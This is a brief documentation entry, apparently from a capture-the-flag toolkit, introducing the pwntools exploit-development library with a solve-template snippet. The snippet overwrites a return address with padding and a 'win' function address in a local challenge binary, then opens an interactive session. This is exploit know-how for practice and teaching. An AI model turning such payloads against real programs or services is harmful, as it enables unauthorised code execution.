# pwntools

https://github.com/Gallopsled/pwntools

Python library for exploit development: process/remote/ELF/ROP/packing helpers. See `categories/pwn/templates/solve.py`.

```python
from pwn import *
context.binary = elf = ELF('./chal')
io = process()                # or connect(host, port)
rop = ROP(elf)
print(rop.dump())             # gadgets available
payload = flat(b'A' * 24, elf.symbols['win'])
io.sendline(payload)
io.interactive()
```